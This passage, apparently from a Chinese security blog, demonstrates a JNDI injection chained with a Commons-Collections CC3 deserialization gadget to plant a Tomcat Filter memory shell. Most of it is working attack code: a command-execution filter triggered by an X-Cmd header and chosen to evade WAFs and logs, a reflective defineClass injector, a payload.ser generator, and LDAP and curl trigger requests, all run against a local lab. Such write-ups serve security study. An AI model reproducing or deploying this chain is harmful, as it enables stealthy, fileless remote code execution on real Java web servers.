判断是否是&quot;木马请求&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">// 设置响应编码</span></span><br><span class="line">            response.setContentType(<span class="string">&quot;text/plain;charset=GBK&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            <span class="comment">// 执行命令并写回</span></span><br><span class="line">            writer.write(execCmd(cmd));</span><br><span class="line">            writer.flush();</span><br><span class="line">            <span class="comment">// 直接返回，不放行到后续 Filter/Servlet</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 普通请求：透明放行，不影响业务</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 命令执行逻辑</span></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">execCmd</span><span class="params">(String command)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 跨平台写法</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">os</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();</span><br><span class="line">            String[] cmdArray = os.contains(<span class="string">&quot;win&quot;</span>)</span><br><span class="line">                    ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;</span><br><span class="line">                    : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125;;</span><br><span class="line">            <span class="comment">// ProcessBuilder 而非 Runtime.exec()，参数不走 shell 解析，避免空格截断</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmdArray).start();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 同时读 stdout + stderr，命令报错时也能回显</span></span><br><span class="line">            <span class="keyword">try</span> (<span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(p.getInputStream(), <span class="string">&quot;GBK&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">while</span> (sc.hasNextLine()) sb.append(sc.nextLine()).append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(p.getErrorStream(), <span class="string">&quot;GBK&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">while</span> (sc.hasNextLine()) sb.append(sc.nextLine()).append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            p.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            sb.append(<span class="string">&quot;Error: &quot;</span>).append(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>触发方式</strong>：只需在 HTTP 请求里带上 <code>X-Cmd</code> 头即可：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/任意路径</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">X-Cmd</span><span class="punctuation">: </span>whoami</span><br></pre></td></tr></table></figure>
+
+<p><strong>为什么用请求头而不是参数？</strong></p>
+<ul>
+<li>请求头不会出现在 URL 里，WAF&#x2F;日志不容易记录</li>
+<li>不依赖具体的请求路径或参数名，隐蔽性更强</li>
+</ul>
+<h3 id="TemplatesImpl加载内存马字节码"><a href="#TemplatesImpl加载内存马字节码" class="headerlink" title="TemplatesImpl加载内存马字节码"></a>TemplatesImpl加载内存马字节码</h3><p>Filter 有了，需要写一个加载器，使用 Base64 + defineClass 的方式动态加载。</p>
+<p>先写一个 class 文件转换 Base64 的工具类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 工具类：将 CmdFilter.class 文件转为 Base64 字符串</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassToBase64</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 默认路径：target/classes/com/vuln/CmdFilter.class</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">classPath</span> <span class="operator">=</span> <span class="string">&quot;target/classes/com/vuln/CmdFilter.class&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (args.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            classPath = args[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(classPath));</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获得 Base64 之后放入注册类里面：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260425134559268.png"></p>
+<p><strong>注册类（注意这个注册类需要继承 <code>AbstractTranslet</code>）</strong>，因为这个类是需要转换成字节传入 CC3 链中的<code>_bytecodes</code>的，而<code>_bytecodes</code>反序列化的要求就是需要继承<code>AbstractTranslet</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.ParallelWebappClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.webresources.StandardRoot;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterInject</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;  <span class="comment">// ← 关键：继承这个</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 把注入逻辑放 static 块，类加载时就执行，更可靠</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            inject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            t.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// AbstractTranslet 要求实现的两个抽象方法，空实现即可</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, SerializationHandler[] handlers)</span></span><br><span class="line">            <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, DTMAxisIterator it, SerializationHandler handler)</span></span><br><span class="line">            <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册主方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">inject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取 StandardContext</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">ParallelWebappClassLoader</span> <span class="variable">pwcl</span> <span class="operator">=</span> (ParallelWebappClassLoader) cl;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">resourcesField</span> <span class="operator">=</span> getFieldFromHierarchy(pwcl.getClass(), <span class="string">&quot;resources&quot;</span>);</span><br><span class="line">        resourcesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resources</span> <span class="operator">=</span> resourcesField.get(pwcl);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> extractContext(resources);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Base64 解码还原 CmdFilter 字节码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQArQoAKABgBwBhBwBiC......&quot;</span>; <span class="comment">// CmdFilter 的 Base64</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = Base64.getDecoder().decode(b64);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射调用 defineClass 来实例化 evilFilter</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(</span><br><span class="line">                <span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Class&lt;?&gt; filterClass = (Class&lt;?&gt;) defineClass.invoke(cl, classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">evilFilter</span> <span class="operator">=</span> (Filter) filterClass.getDeclaredConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Filter 注册三步骤</span></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">        filterDef.setFilter(evilFilter);</span><br><span class="line">        filterDef.setFilterClass(evilFilter.getClass().getName());</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        standardContext.addFilterMap(filterMap);</span><br><span class="line">        <span class="comment">// 代替 FilterConfig 的注册流程</span></span><br><span class="line">        standardContext.filterStart();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Filter memory shell injected!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配合上面的 StandardContext 获取的两个工具方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Field <span class="title function_">getFieldFromHierarchy</span><span class="params">(Class&lt;?&gt; clazz, String name)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123; <span class="keyword">return</span> clazz.getDeclaredField(name); &#125;</span><br><span class="line">            <span class="keyword">catch</span> (NoSuchFieldException e) &#123; clazz = clazz.getSuperclass(); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> StandardContext <span class="title function_">extractContext</span><span class="params">(Object resources)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (resources <span class="keyword">instanceof</span> StandardRoot) &#123;</span><br><span class="line">            <span class="type">StandardRoot</span> <span class="variable">sr</span> <span class="operator">=</span> (StandardRoot) resources;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> sr.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ctx</span> <span class="operator">=</span> f.get(sr);</span><br><span class="line">            <span class="keyword">if</span> (ctx <span class="keyword">instanceof</span> StandardContext) <span class="keyword">return</span> (StandardContext) ctx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整打法演示"><a href="#完整打法演示" class="headerlink" title="完整打法演示"></a>完整打法演示</h3><p>接下来把这个类写入 CC3 链中的<code>_bytecodes</code>里，可以写工具类，这里直接在 CC3 链里面读取 class 了，需要用 javac 编译一下或者直接用 IDEA 的 maven 编译：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260425135407010.png"></p>
+<p>编写 CC3 链顺便生成 ser 文件给 LDAP 服务用（这个 CC3 也是之前写过的然后照搬小改了一下）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3GeneratePayload</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ========== 请修改为你的 FilterInject.class 实际路径 ==========</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">classFilePath</span> <span class="operator">=</span> <span class="string">&quot;target/classes/com/vuln/FilterInject.class&quot;</span>;</span><br><span class="line">        <span class="comment">// =============================================================</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 读取恶意类字节码（FilterInject 已内嵌 Base64 编码的 CmdFilter）</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(classFilePath));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 构造 TemplatesImpl 并注入字节码</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f1</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        f1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f1.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f2.set(templates, <span class="string">&quot;FilterInject&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 显式设置 _tfactory 避免空指针（可选，但建议保留）</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f3</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        f3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f3.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 构造 CC3 链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 使用 TransformedMap 装饰（配合 AnnotationInvocationHandler）</span></span><br><span class="line">        Map&lt;String, Object&gt; innerMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;dummy&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 反射构造 AnnotationInvocationHandler</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> construct.newInstance(java.lang.annotation.Retention.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. 序列化到文件 payload.ser</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.ser&quot;</span>))) &#123;</span><br><span class="line">            oos.writeObject(handler);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Payload generated: payload.ser&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] File size: &quot;</span> + <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;payload.ser&quot;</span>).length() + <span class="string">&quot; bytes&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行生成 ser 文件：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260425135633276.png"></p>
+<p>启动 LDAP 服务和 Tomcat：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260425135711732.png"></p>
+<p>访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080//vuln?url=ldap://127.0.0.1:1389/exploit</span><br></pre></td></tr></table></figure>
+
+<p>控制台显示注入成功：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260425135826613.png"></p>
+<p>发送 RCE 请求：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;X-Cmd: whoami&quot;</span> http://localhost:8080/任意路径</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260425140013055.png"></p>
+<p>可以正常 RCE。</p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>两种 JNDI 注入方式各有适用场景：</p>
+<p><strong>方式一（Reference 远程类加载）</strong>打低版本 JDK 很方便，工具支持成熟，搭个 HTTP 服务器放恶意类就行，但高版本 JDK 直接死路一条。</p>
+<p><strong>方式二（反序列化链）</strong>是高版本 JDK 下的主流打法，前提是目标 classpath 里得有可利用的反序列化链，这在实际的 Java 应用里其实很常见（CC 系列、CB、Spring 等依赖用得非常普遍）。</p>
+<p><strong>内存马联动</strong>这块，思路和之前内存马系列是一脉相承的，关键是把注入逻辑打包成<code>AbstractTranslet</code>子类的字节码，借 TemplatesImpl 来执行，整条链完全在内存里跑，不写文件，查杀难度大。</p>
+<p>整条链路走完之后，有几个要点值得记一下：</p>
+<ul>
+<li>选择什么反序列化链取决于目标 classpath，CC6 不含 TemplatesImpl，CC3&#x2F;CC2 才能走<code>_bytecodes</code>注入任意字节码</li>
+<li><code>_tfactory</code>要显式设置，避免某些环境下空指针</li>
+<li><code>FilterInject</code>继承<code>AbstractTranslet</code>是硬要求，TemplatesImpl 在反序列化<code>_bytecodes</code>时会校验父类</li>
+<li>注入逻辑放<code>static</code>块比放构造方法更稳，类加载时就执行</li>
+</ul>
+<hr>
+<blockquote>
+<p>参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec 项目</a></li>
+<li>JDK 源码 <code>com.sun.jndi.ldap.Obj#decodeObject</code></li>
+<li>之前的内存马系列（Filter&#x2F;Servlet&#x2F;Listener 篇）</li>
+<li>之前的 CC2&#x2F;CC3 链分析篇</li>
+</ul>
+</blockquote>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="welcome-text" style="text-align: center; padding: 10px 0; font-size: 14px; color: #fff;">欢迎入侵本站</div><div class="text"></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
